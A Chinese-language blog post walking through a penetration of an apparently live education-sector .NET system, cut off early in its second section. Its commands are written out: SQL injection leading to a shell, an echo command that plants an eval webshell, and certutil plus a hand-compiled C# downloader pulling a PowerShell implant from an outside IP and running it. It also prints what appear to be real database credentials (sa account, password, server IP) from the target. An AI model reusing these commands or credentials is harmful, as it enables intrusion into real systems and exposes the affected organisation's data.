<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content=". 第一套切入点我这里通过翻JS首先找到了SQL注入，利用os-shell成功拿到了权限，这是我一年前的漏洞RCE，现在找到一个还存在没修改的拿到shell   然后全局尝试执行whoami被拦截了，cd成功了，已经判断出对方有WAF了，下一步就是写webshell到web目录下 执行如下，这里可以专门去找这种图片，而不是那种jquery等组件的css，js，这样我们通过图片找到的目录不是web目">
<meta property="og:type" content="article">
<meta property="og:title" content="edu一套上一千分的系统代码审计(dotNet)">
<meta property="og:url" content="http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/index.html">
<meta property="og:site_name" content="塔菲">
<meta property="og:description" content=". 第一套切入点我这里通过翻JS首先找到了SQL注入，利用os-shell成功拿到了权限，这是我一年前的漏洞RCE，现在找到一个还存在没修改的拿到shell   然后全局尝试执行whoami被拦截了，cd成功了，已经判断出对方有WAF了，下一步就是写webshell到web目录下 执行如下，这里可以专门去找这种图片，而不是那种jquery等组件的css，js，这样我们通过图片找到的目录不是web目">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/189459/35/37527/70095/64fdb744F5808a7f3/0c7f25d9d57545f6.jpg">
<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/168809/17/37629/165305/64edac9fFf610db08/4f5686a7b2169d2e.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/171912/10/39846/93515/64edaf55Fecdedbff/07b7c32b093c138e.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/112524/24/28700/86327/64edaf6dFd8c6dd04/d3715e381f4efe98.jpg">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/132344/11/37183/103860/64edafe8F5cd1443e/87a4416b27a8058b.jpg">
<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/185875/33/37672/34584/64edafbfF660f41fc/092dfcdf02d46554.jpg">
<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/97442/30/44037/62290/64edb078F2a3e1b28/a1e02b555857409f.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/134076/5/37056/75659/64edb095F4b5e207b/8c488fb0579a11ab.jpg">
<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/181544/25/36170/36624/64edb0d1Faa7b5f88/1750ff16cc2376f3.jpg">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/187368/1/37164/63668/64edb133Fd70da356/24f56a48fe8b59f6.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/221135/15/35340/41314/64edb16dFe0102493/0ba29db666d58078.jpg">
<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/134316/11/37787/116205/64edb193F12a900a7/e9721c6b4be50f3a.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/88362/23/40841/53347/64edb1e5F5430954e/25d05e8013a7ab4e.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/177314/25/36765/34229/64edb2ecF318d2b4f/83cda92ee9b7e295.jpg">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/159817/4/30880/84199/64edb332F66b9ff92/06a1cc83a3ce080b.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/205492/31/33764/19023/64edb372Fc5c2347e/cf2dd8701320867c.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/104742/18/43480/11481/64edb85fF0584c21f/39b7ab94782dc526.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/137543/23/39373/128518/64edb926F9c5cc60d/c6c196c8fa6208f1.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/133451/11/36258/11394/64edb949F36d4ab4a/a3eef3095e5ee630.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/99251/29/43640/100653/64edb9faF1cec9b13/7028062975cf22e7.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/103158/36/28103/71974/64ee9cb8F98d1c178/7a326da7eaf13ddf.jpg">
<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/162603/22/35781/101511/64ee9d43F394899be/028506d2c01b0d89.jpg">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/128986/38/40638/21772/64ee9d99F3de95375/cdf6eec6519cb70d.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/109472/27/44800/64158/64ee9dccF3150e8e5/3c702de79fd79108.jpg">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/168385/18/39966/11980/64ee9e10F9ab003b5/162d00f9fcf21ac1.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/132140/4/39327/48363/64ee9e3aFe430d75e/28e22c5af7f08951.jpg">
<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/168800/29/41046/25379/64eea1c0F8a15c174/21e4fd9bf499aa45.jpg">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/211801/39/36152/44923/64eea1ccF0ea8e4e0/6e70578b0e9b6bc3.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/142207/2/40336/47823/64eea1d4Fb5a0d55d/06bb28079478c3ec.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/100739/18/34742/101800/64eeaf01Ff320347c/1547afc2eb1c0e10.jpg">
<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/101283/33/44224/78130/64eeb086Fab4fd428/7576a90c2aecf0ab.jpg">
<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/197241/31/38277/58152/64eeb0fcFce3593f9/043dc3736c506e32.jpg">
<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/98199/17/24823/66264/64fdb910Fe0e1be9d/0bbc816e607ec6c0.jpg">
<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/188163/32/37044/52946/64fdb96dF66c0ea8f/11cbe5a12e8418ed.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/126197/20/40440/14053/64fdb9bfF1ee8554f/3051e1649cc98076.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/221381/30/36113/121708/64fdba1fF3d79ad41/53a7a67516e0d09c.jpg">
<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/124785/38/35095/24652/64fdbb6eF67f36707/b957949158365cad.jpg">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/178020/38/38027/16585/64fdbb86F652225ce/1a989d91f3608377.jpg">
<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/91202/22/32012/91641/64f0031eF48f0d4e3/74a27ef28de18f6c.jpg">
<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/166379/26/38490/308503/64fdbca4Ff4b4df7a/3df64ba80cfdc7a1.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/156712/19/39918/42643/64fdbd24Fe71b8b61/1a0b7dbd5760895c.jpg">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/177932/20/36608/183672/64f03e44Fd67e7c42/d1560deb03f7272b.jpg">
<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/150379/30/31136/155251/64fdbde0F5b93b730/733ab2d0b5443ecf.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/204157/25/32848/64376/64fdbe8dF04735148/7d6cc58de5537a36.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/223102/34/36496/76297/64fdbfa5Fb1f900e7/a73661cc9748e38e.jpg">
<meta property="og:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/186769/16/37451/121053/64fdbfbbFc282b08c/83d9d968fdc47148.jpg">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/71732/40/23712/127794/64fdc232F812f1d66/a9b62aeff391e15e.jpg">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/104006/8/43433/47652/64fdc3d8F753a7b2a/037a3590184a78df.jpg">
<meta property="og:image" content="https://img13.360buyimg.com/ddimg/jfs/t1/183451/39/38155/31859/65093769F89e01ebf/40bebd3d22ff4f17.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/95840/17/43488/17113/64fdc48aF82586333/c5d32b6a816cac56.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/195945/31/36456/97549/64fc5b06F00ea08d3/893806a933fa76e5.jpg">
<meta property="og:image" content="https://img14.360buyimg.com/ddimg/jfs/t1/109960/32/44927/54720/64fdc4d1F2158b952/394499d2af06c1d6.jpg">
<meta property="og:image" content="https://img10.360buyimg.com/ddimg/jfs/t1/223244/24/25966/107609/64fc5c7eF6210b82f/385a0631d62d0869.jpg">
<meta property="og:image" content="https://img11.360buyimg.com/ddimg/jfs/t1/101519/31/44682/66886/64fdc518Fcbe03e19/03cde6ef0634da4e.jpg">
<meta property="article:published_time" content="2023-08-29T08:27:17.000Z">
<meta property="article:modified_time" content="2024-01-09T07:39:02.513Z">
<meta property="article:author" content="塔菲">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img12.360buyimg.com/ddimg/jfs/t1/189459/35/37527/70095/64fdb744F5808a7f3/0c7f25d9d57545f6.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>edu一套上一千分的系统代码审计(dotNet)</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/09/03/dotnet%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%E5%BE%AA%E7%8E%AF%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC%E5%B7%A5%E5%85%B7%E7%BC%96%E5%86%99/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/08/08/dotnet%E4%B8%8B%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&text=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&title=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&is_video=false&description=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=edu一套上一千分的系统代码审计(dotNet)&body=Check out this article: http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&title=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&title=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&title=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&title=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&name=edu一套上一千分的系统代码审计(dotNet)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/29/edu%E4%B8%80%E5%A5%97%E4%B8%8A%E4%B8%80%E5%8D%83%E5%88%86%E7%9A%84%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(dotNet)/&t=edu一套上一千分的系统代码审计(dotNet)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%A5%97"><span class="toc-number">1.</span> <span class="toc-text">第一套</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%87%E5%85%A5%E7%82%B9"><span class="toc-number">1.1.</span> <span class="toc-text">切入点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%84%B1%E6%BA%90%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">脱源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%89%80%E5%9C%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.3.</span> <span class="toc-text">找到账号密码所在的数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8-SQL%E6%B3%A8%E5%85%A5-1%EF%BC%88%E5%B1%95%E7%A4%BA%E9%83%A8%E5%88%86%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">前台任意方法调用-SQL注入 * 1（展示部分）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8-SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-number">1.5.</span> <span class="toc-text">前台任意方法调用-SQL注入 * 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.6.</span> <span class="toc-text">通用弱口令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E5%89%8D%E5%8F%B0%E5%BC%80%E5%90%AFxp-cmdshell-gt-RCE"><span class="toc-number">1.7.</span> <span class="toc-text">SQL前台开启xp_cmdshell -&gt; RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF"><span class="toc-number">1.8.</span> <span class="toc-text">任意方法调用获取当前数据库配置信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E5%AF%BC%E8%87%B4%E7%94%A8%E6%88%B7%E8%B4%A6%E5%8F%B7%E6%B3%84%E9%9C%B2-%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81"><span class="toc-number">1.9.</span> <span class="toc-text">任意方法调用导致用户账号泄露-默认密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83-1%EF%BC%88%E8%BA%AB%E4%BB%BD%E8%AF%81%EF%BC%89"><span class="toc-number">1.10.</span> <span class="toc-text">后台未授权 * 1（身份证）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83-2%EF%BC%88%E5%AF%86%E7%A0%81%EF%BC%89"><span class="toc-number">1.11.</span> <span class="toc-text">后台未授权 * 2（密码）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-10%E5%A4%84"><span class="toc-number">1.12.</span> <span class="toc-text">任意文件下载 * 10处</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E6%8B%B3"><span class="toc-number">1.13.</span> <span class="toc-text">组合拳</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%A5%97"><span class="toc-number">2.</span> <span class="toc-text">第二套</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        edu一套上一千分的系统代码审计(dotNet)
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">塔菲</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-29T08:27:17.000Z" class="dt-published" itemprop="datePublished">2023-08-29</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>.</p>
<h3 id="第一套"><a href="#第一套" class="headerlink" title="第一套"></a>第一套</h3><h4 id="切入点"><a href="#切入点" class="headerlink" title="切入点"></a>切入点</h4><p>我这里通过翻JS首先找到了SQL注入，利用os-shell成功拿到了权限，这是我一年前的漏洞RCE，现在找到一个还存在没修改的拿到shell</p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/189459/35/37527/70095/64fdb744F5808a7f3/0c7f25d9d57545f6.jpg" alt="image.png"></p>
<p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/168809/17/37629/165305/64edac9fFf610db08/4f5686a7b2169d2e.jpg" alt="image.png"></p>
<p>然后全局尝试执行whoami被拦截了，cd成功了，已经判断出对方有WAF了，下一步就是写webshell到web目录下</p>
<p>执行如下，这里可以专门去找这种图片，而不是那种jquery等组件的css，js，这样我们通过图片找到的目录不是web目录就是压缩备份好的目录</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir /s /b E:\97a68e5c-0ad2-4123-9a0e-9118fdc5a758.png</span><br></pre></td></tr></table></figure>

<p>找到之后我们利用拼接符号 &amp; 批量执行，这里C盘下目录权限可能不够，我们在D盘执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /d E:\\shool\\hhsoft20211223\\upload\\2\\UserImg\\20220104\ &amp; echo &quot;&lt;%@Page Language=JS%&gt;&lt;%eval%&gt;&lt;%(Request.%&gt;&lt;%Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;&quot; &gt;12345.aspx &amp; dir</span><br></pre></td></tr></table></figure>

<p>这里的一句话是变种的，原本一句话被WAF拦的，且我的免杀马是多行，追加写入的话，&gt;符号会和&gt;&gt; 这个追加写符号起冲突，所以直接写一句话算了</p>
<p>这里我也尝试直接远程下载cs木马上线，但是失败了，刚开始我以为是不免杀，换了免杀的还是失败，起初我用的命令是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="operator">-</span>urlcache <span class="operator">-</span>split <span class="operator">-</span>f http:<span class="operator">/</span><span class="operator">/</span><span class="number">43.143</span><span class="number">.194</span><span class="number">.127</span><span class="operator">/</span><span class="number">12345.</span>ps1 <span class="operator">&amp;</span> powershell .\<span class="number">12345.</span>ps1</span><br></pre></td></tr></table></figure>

<p>猜测certutil命令用不了，改用自己编译下载器</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="operator">|</span> <span class="keyword">set</span> <span class="operator">/</span>p<span class="operator">=</span>&quot;using System;using System.Net;class zz&#123;static void Main(string[] args)&#123;if(args.Length &gt;= 2)&#123;try&#123;new WebClient().DownloadFile(args[0],args[1]);Console.WriteLine(111);&#125;catch(Exception e)&#123;Console.WriteLine(e.ToString());&#125;&#125;&#125;&#125;&quot; <span class="operator">&gt;</span> <span class="number">23.</span>txt</span><br></pre></td></tr></table></figure>

<p>编译产生下载器exe</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v2<span class="number">.0</span><span class="number">.50727</span>\csc.exe <span class="number">23.</span>txt</span><br></pre></td></tr></table></figure>

<p>然后生成了23.exe</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">23.</span>exe [URL] [存储路径]</span><br><span class="line"><span class="number">23.</span>exe http:<span class="operator">/</span><span class="operator">/</span><span class="number">43.143</span><span class="number">.194</span><span class="number">.127</span><span class="operator">/</span><span class="number">12345.</span>ps1 <span class="number">12345.</span>ps1 <span class="operator">&amp;</span> powershell .\<span class="number">12345.</span>ps1</span><br></pre></td></tr></table></figure>

<p>发现也是失败的，这里提示：拒绝访问，猜测应该是WAF禁止从网上这样拉取文件，如果是powershell禁用，可以用ping命令查看是否禁用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">Test-Connection</span> <span class="literal">-ComputerName</span> fl8nw3.ceye.io <span class="literal">-Count</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="脱源码"><a href="#脱源码" class="headerlink" title="脱源码"></a>脱源码</h4><p>脱源码这里我不讲解了，因为我的webshell权限低，比os-shell那个还低，大部分常见的cmd命令全都禁用了，所以我的源码是脱的其他主机的</p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/171912/10/39846/93515/64edaf55Fecdedbff/07b7c32b093c138e.jpg" alt="image.png"></p>
<p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/112524/24/28700/86327/64edaf6dFd8c6dd04/d3715e381f4efe98.jpg" alt="image.png"></p>
<h4 id="找到账号密码所在的数据库"><a href="#找到账号密码所在的数据库" class="headerlink" title="找到账号密码所在的数据库"></a>找到账号密码所在的数据库</h4><p>在<code>XmlConfig/database.config</code>下，找到数据库连接账号密码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Server<span class="operator">=</span><span class="number">39.102</span><span class="number">.129</span><span class="number">.52</span>;<span class="keyword">Initial</span> Catalog<span class="operator">=</span>honghua2703;<span class="keyword">User</span> ID<span class="operator">=</span>sa;Password<span class="operator">=</span>honghua22083865;</span><br></pre></td></tr></table></figure>

<p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/132344/11/37183/103860/64edafe8F5cd1443e/87a4416b27a8058b.jpg" alt="image.png"></p>
<p>这里我们直接在登陆这里</p>
<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/185875/33/37672/34584/64edafbfF660f41fc/092dfcdf02d46554.jpg" alt="image.png"></p>
<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/97442/30/44037/62290/64edb078F2a3e1b28/a1e02b555857409f.jpg" alt="image.png"></p>
<p>这里定位到这个CheckLogin方法，这里有一个Sys_AccountEntity类及实例化的对象，我们看这个数据库类</p>
<p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/134076/5/37056/75659/64edb095F4b5e207b/8c488fb0579a11ab.jpg" alt="image.png"></p>
<p>发现的确是SYS_ACCOUNT这个表存储了账号密码相关信息，下面还有ACCOUNTPWD字段</p>
<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/181544/25/36170/36624/64edb0d1Faa7b5f88/1750ff16cc2376f3.jpg" alt="image.png"></p>
<p>mssql执行</p>
